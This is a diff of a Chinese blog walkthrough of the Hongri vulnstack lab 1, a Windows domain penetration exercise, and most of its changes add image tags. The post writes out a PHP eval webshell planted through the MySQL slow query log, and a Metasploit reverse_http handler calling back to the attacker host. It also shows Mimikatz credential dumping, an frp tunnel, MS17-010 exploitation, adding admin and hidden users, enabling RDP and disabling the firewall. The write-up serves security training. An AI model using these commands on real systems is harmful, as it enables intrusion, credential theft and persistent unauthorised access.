@@ -293,33 +293,33 @@
                 <p>红日靶场（一）</p>
 <span id="more"></span>
 
-<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>靶场地址<a class="link"   target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" >http://vulnstack.qiyuanxuetang.net/vuln/detail/2/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>靶场地址<a class="link" target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/<i class="fas fa-external-link-alt"></i></a></p>
 <p>虚拟机所有统一密码：hongrisec@2019</p>
-<p>搭建环境可以参考视频 —— <a class="link"   target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV13W4y1t7qB/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=a4eba559e280bf2f1aec770f740d0645" >https://www.bilibili.com/video/BV13W4y1t7qB/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&amp;vd_source=a4eba559e280bf2f1aec770f740d0645<i class="fas fa-external-link-alt"></i></a></p>
+<p>搭建环境可以参考视频 —— <a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV13W4y1t7qB/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=a4eba559e280bf2f1aec770f740d0645">https://www.bilibili.com/video/BV13W4y1t7qB/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&amp;vd_source=a4eba559e280bf2f1aec770f740d0645<i class="fas fa-external-link-alt"></i></a></p>
 <p>说白了其实就是调整一下 IP，然后调整一下 win7，加一块桥接模式的网卡，其他的无需做更改。然后进去之后需要更改密码，我这里都改成了 <code>drunkbaby123!</code></p>
 <ul>
 <li>靶场拓扑如下</li>
 </ul>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/TPic.png" class>
 
 <h2 id="0x02-外网打点"><a href="#0x02-外网打点" class="headerlink" title="0x02 外网打点"></a>0x02 外网打点</h2><h3 id="拿-shell"><a href="#拿-shell" class="headerlink" title="拿 shell"></a>拿 shell</h3><p>靶机 IP 在我这里是 192.168.5.14，可以通过 ipconfig 在 win7 中查看，也就是说目前的场景是拿到目标 IP 192.168.5.14，先进行 nmap 扫描一下</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/nmap.png" class>
 
 <p>扫描出来发现 80 端口和 3306 端口存货，访问 80 端口，发现这是一个 PHP 探针</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/php80.png" class>
 
 <p>在此界面发现绝对路径泄露，信息为 <code>C:/phpStudy/WWW</code>，但没什么用</p>
 <p>接着用 dirsearch 扫描一下是否存在其他接口</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/phpMyAdminLeak.png" class>
 
 <p>访问泄露的 <code>/phpMyAdmin</code></p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/myAdminIndex.png" class>
 
 <p>此处弱口令 <code>root/root</code> 成功登录</p>
 <p>接下来我们可以尝试 MySQL 写入一句话木马，因为我们刚刚在 PHP 探针界面已知了绝对路径</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;%secure%&#x27;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/MySQLDetect.png" class>
 
 <p><code>secure_file_priv</code> 为 <code>NULL</code>，禁止导入导出，所以这里没法用 <code>into outfile</code> 的方式写入木马了，只能通过日志文件写入木马来攻击</p>
 <p>思路与 PHP 文件包含中的日志 UA 传马类似，这里相比更简单一些，通过在日志中写日志，修改日志路径，实现写马。</p>
@@ -328,7 +328,7 @@
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/startLogFunction.png" class>
 
 <p>接下来修改 <code>slow_query_log_file</code> 日志文件的绝对路径以及文件名，我们这里已知绝对路径，因此直接写即可</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -336,90 +336,90 @@
 <p>此时可以看一下是否修改成功</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/modifyFiles.png" class>
 
 <p>可以看到路径是绝对文件路径，也就是修改成功了；接下来向日志文件写入 <code>shell</code></p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/writeShell.png" class>
 
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="keyword">OR</span> sleep(<span class="number">10</span>) </span><br></pre></td></tr></table></figure>
 
 <p>用蚁剑连 shell，拿下 shell 之后准备横移</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/AntShell.png" class>
 
 <p>执行一下 <code>ipconfig</code>，发现存在两张网卡</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/ipconfig.png" class>
 
 <h3 id="CS-上线"><a href="#CS-上线" class="headerlink" title="CS 上线"></a>CS 上线</h3><p>这里先需要用 CS 起一个 50050 的端口监听，命令是 </p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 192.168.5.8 kali</span><br><span class="line"></span><br><span class="line">// 对应 ./teamserver ip password</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/csListen.png" class>
 
 <p>接着用 CS 去连即可</p>
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/runBat.png" class>
 
-
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/Connect.png" class>
 
 <p>连上之后先生成🐎，这里如果是 kali 开的 CS，IP 就填写 kali 的 IP</p>
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/execFile.png" class>
 
-
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/NewListen.png" class>
 
 <p>再用蚁剑上传文件</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/AntSwordShell.png" class>
 
 <p>通过蚁剑命令执行 exe 文件。此时可以看到 Win7 成功上线</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/CSuccess.png" class>
 
 <h2 id="0x03-内网横移"><a href="#0x03-内网横移" class="headerlink" title="0x03 内网横移"></a>0x03 内网横移</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>在横移之前我们需要先做信息收集</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/netConfig.png" class>
 
 <p>可以确定当前域为 <code>god.org</code><br>查看域内机器</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Net view</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/netView.png" class>
 
 <p>可以发现有两台内网机器，同时确定域服务器名称为 <code>OWA</code>  </p>
 <p>CS 此时已上线，我们使用 <code>hashdump</code> 抓取密码</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/hashDump.png" class>
 
 <p>运行 <code>Mimikatz</code> 获取明文密码</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/mimikatz.png" class>
 
 <h3 id="msf-接管主机"><a href="#msf-接管主机" class="headerlink" title="msf 接管主机"></a>msf 接管主机</h3><p>接下来联动 <code>msf</code>，继续进行渗透，在 <code>kali</code> 中输入 <code>msfconsole</code> 进入msf，接下来利用 handler 模块开启监听</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.10.128  // 对应 kali CS 的机子 ip</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/msfListenRun.png" class>
 
 <p>先开启 msf 的监听，接下来回到 CS，右键选择 Spawn</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/Spawn.png" class>
 
 <p>设置 Payload 为 <code>Foreign HTTP</code>，监听ip为 <code>kali</code> IP，端口为刚刚的 <code>8888</code> 端口</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/msfOn.png" class>
 
 <p>执行 <code>shell</code> 命令，此时就可以接管主机了</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/shellMSF.png" class>
 
 <p>接下来搜集补丁信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/shellMSF.png" class>
 
 <p>搜集电脑上安装的软件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/collectSoftwares.png" class>
 
 <p>发现存在 <code>nmap</code>，已知这里存在内网，我们这里添加新路由</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/addRoute.png" class>
 
 <p>接下来去设置代理，这里使用 <code>frp</code> 进行内网穿透，首先在 kali 中执行命令如下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/frpsSet.png" class>
 
 <p>接下来将 <code>frpc.exe</code> 和 <code>frpc.ini</code> 通过蚁剑上传到 win7，注意这里要上传 winamd64 的，而不是上传 Linux 的，修改 <code>frpc.ini</code> 内容如下</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">52.130</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7777</span> </span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure>
@@ -427,81 +427,81 @@
 <p>接下来执行<code>frpc</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/frpcSuccess.png" class>
 <p>可以发现代理已设置成功，直接对内网机器进行攻击即可，扫描机器存活端口，这里要先退出 session1 会话，在 msf 下执行这些命令。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141   // win 2003 的机子</span><br><span class="line"><span class="built_in">set</span> threads 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 
 <p>扫描到存在<code>135、445</code>端口，说明存在<code>SMB</code>服务</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/scanPorts.png" class>
 
 <h3 id="接管域成员"><a href="#接管域成员" class="headerlink" title="接管域成员"></a>接管域成员</h3><h4 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h4><p>首先扫描机器版本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p>发现是 Windows2003 版本，那么接下来我们验证一下是否存永恒之蓝漏洞</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/win2003Find.png" class>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 1</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/ms17_010Find.png" class>
 
 <p>可以发现确实存在永恒之蓝漏洞，直接打</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="built_in">whoami</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/ms17AttackSuccess.png" class>
 
 <p>我们的思路是添加用户，升级为管理员权限，然后尝试手动开启 3389 端口实现机器接管</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net user <span class="built_in">test</span> hongrisec@2019 /add <span class="comment">#添加用户</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/useradd.png" class>
 
 <p>接下来添加管理员权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net localgroup administrators <span class="built_in">test</span> /add <span class="comment">#管理员权限</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/adminAdd.png" class>
 
 <p>接下来尝试开启 3389 端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span></span><br><span class="line">run </span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/open3389.png" class>
 
 <p>然后用 kali 自带的 RDP 去连接</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.52.141</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/rdp3389Success.png" class>
 
 <p>成功拿下主机</p>
 <h4 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h4><p>因为有过 win2003 拿 shell 的经历了，所以 win2008 大致上也是差不多</p>
 <p>扫描域控存活端口发现 <code>135、445</code> 存活，存在 <code>SMB</code> 服务，探测主机版本</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/2008SMBversion.png" class>
 
 <p>接下来同上，执行命令，添加管理员，并开启 3389 端口开放 RDP</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="built_in">whoami</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net user <span class="built_in">test</span> hongrisec@2019 /add <span class="comment">#添加用户</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net localgroup administrators <span class="built_in">test</span> /add <span class="comment">#管理员权限</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span> <span class="comment">#关闭防火墙</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/adminGet2008.png" class>
 
-
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/win2008CloseFirewall.png" class>
 
 <p>随后登录成功，但是这里需要我们去到 GOD 域，直接的 OWA 域上不去</p>
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/loginGODDomain.png" class>
 
 <p>而后我们反弹 shell</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/shellwin2008.png" class>
 
 <h4 id="给-win-2008-机子创建一个隐藏用户，并克隆管理员账户"><a href="#给-win-2008-机子创建一个隐藏用户，并克隆管理员账户" class="headerlink" title="给 win 2008 机子创建一个隐藏用户，并克隆管理员账户"></a>给 win 2008 机子创建一个隐藏用户，并克隆管理员账户</h4><p>先看一下目前的用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/04/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/netUser2003.png" class>
 
 <p>然后我们新创建一个用户，这里创建用户我们可以加上 <code>$</code> 符号，这个符号可以使得该用户在命令行中隐藏。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user drunkbaby$ drunkbabySec1! /add</span><br></pre></td></tr></table></figure>
 
 <p>这时候我们再用 <code>net user</code> 查看，发现并没有 <code>drunkbaby</code> 这个用户，但是在用户管理中可以发现。</p>
-<p>具体参考 <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Auuuuuuuu/article/details/86746597" >https://blog.csdn.net/Auuuuuuuu/article/details/86746597<i class="fas fa-external-link-alt"></i></a></p>
+<p>具体参考 <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Auuuuuuuu/article/details/86746597">https://blog.csdn.net/Auuuuuuuu/article/details/86746597<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>总体上算是 Windows 域渗透比较标准的一套流程了，不过一些难点比如黄金票据，白银票据还没有提及。</p>
 
             </div>
